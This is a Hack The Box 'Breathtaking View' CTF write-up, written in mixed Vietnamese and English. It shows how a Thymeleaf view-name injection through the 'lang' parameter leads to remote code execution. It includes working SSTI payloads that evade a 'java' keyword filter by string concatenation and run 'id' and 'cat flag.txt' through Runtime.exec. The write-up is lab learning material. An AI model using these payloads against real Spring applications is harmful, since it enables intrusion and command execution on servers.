---
title: "Breathtaking View"
slug: "htb-breathtaking-view"
platform: "Hack The Box"
difficulty: "Medium"
vulnerabilities: ["Server-Side Template Injection"]
publishedAt: "2026-09-14"
summary: "Ghi lại quá trình phân tích tên template và kiểm chứng biểu thức trong challenge Breathtaking View."
draft: false
sortOrder: 13
---
đây là app spring boot + thymeleaf
have some functions,characteristic like:
 - login/register
 - session-based
 - none DB
## After reviewing source code, we can analyze some possible vulnerability
### View Name Injection
![image](https://hackmd.io/_uploads/H10IAhGo-e.png)
lang = user input được nối trực tiếp không sanitize
Thymeleaf có thể evaluate expression trong view name
→ dẫn tới SSTI → RCE.
block only "java" meaningless
=> path traversal ở tầng template
=> SSTI / expression abuse tùy cách Thymeleaf xử lý
and some other sub injection in
## chốt hướng SSTI / Thymeleaf template injection through lang prameter
Hướng path traversal we guess cannot exploit because it not go into file I/O API. 
Combine with test some param we xác nhận được rằng path traversal not exist.
![image](https://hackmd.io/_uploads/SJW3zMCjZl.png)

Xác nhận lại rằng dùng spring boot làm back end và thymeleaf là template engine giờ mình sẽ đi đọc về syntax của thymeleaf và test chỗ lang = userinput như đã nói ở trên.
Lúc đầu, tôi test **${7*7}** -> có kết quả như sau

![Screenshot 2026-04-04 112809](https://hackmd.io/_uploads/B1n07zAobx.png)

${...} trong Thymeleaf là variable expression, kết hợp việc đọc source code cái input này nó không nằm trong nội dung HTML bình thường.
![image](https://hackmd.io/_uploads/Byx5NzAjZx.png)
dựa vào đây và 
![image](https://hackmd.io/_uploads/Hk_TNMCjbg.png)

=>>>>> giá trị lang không phải “nội dung để in ra”, mà là một phần tên template. vì vậy mình cần đưa vào đó cái gì trông giống template reference
tra tài liệu ta có cấu trúc sau: template :: fragment
ta nghĩ đến payload sau  **${7*7}__::.x** 
Với phần trước dấu :: là template name và hành vi của thymeleaf là thấy experession nên nó tính luôn trước khi đi tìm đúng địa chỉ còn .x chỉ là một phần fragment giả
![image](https://hackmd.io/_uploads/Skdk_GRjbl.png)
sau khi thử đã ra đúng 49.
![image](https://hackmd.io/_uploads/H12fufAi-l.png)

__${7*7}__::.x/index giải thích cho việc có mỗi 49 chứ không phải 49/index thì payload đang ghép lại kiểu như này
=>>XÁC NHẬN ĐÃ CÓ SSTI 

Ta muốn từ SSTI sang đọc file, ta cần các java class để đọc file mà lại có đoạn 
![image](https://hackmd.io/_uploads/rks73MCjWg.png)
ta có nghĩ đến việc tách sau đó cộng chuỗi như **__${'ja'+'va'}__::.x** 

vì việc check string chứa "java" nó thực hiện ở bước controller mà ở bước này cái kia chưa có chữ java. sau khi controller đưa view name Thymeleaf mới xử lý và lúc này sẽ uất hiện chữ java
![image](https://hackmd.io/_uploads/SyoXTzRjZe.png)
yah thanh cong roi
từ đây muốn lấy được java.lang.runtime để chạy lệnh ta sẽ có một hàm là forName(...) để lấy ra class
![image](https://hackmd.io/_uploads/rJcxfmAj-x.png)

Ta đã có class Runtime và từ đây làm sao để lấy ra được object để dùng => có cách là Runtime.getRuntime() => lấy method và từ đó gọi method => thử rce
```java=
__${''.class.forName('ja'+'va.lang.Runtime')
    .getMethod('getRuntime')
    .invoke(null)
    .exec('id')}__::.x
```
![image](https://hackmd.io/_uploads/S1-HY7Robx.png)


nhưng nó chưa in output ra màn hình và đây chỉ trả về process object => còn một bước nữa là đọc stream của process.
Để thấy được output, ta cần method getInputStream() và qua method vẫn chưa phải chuỗi in được ta cần lớp java.util.Scanner và sử dụng thêm userDelimiter("\\A")  next() để toàn bộ output thành string.
kết hợp việc đổi lệnh cat flag.txt ta có 
```java=
__${''.class.forName('ja'+'va.util.Scanner')
.getConstructor(''.class.forName('ja'+'va.io.InputStream'))
.newInstance(
    ''.class.forName('ja'+'va.lang.Runtime')
    .getMethod('getRuntime')
    .invoke(null)
    .exec('cat flag.txt')
    .getInputStream()
)
.useDelimiter('\\A')
.next()}__::.x
```

![image](https://hackmd.io/_uploads/SywCqX0jZx.png)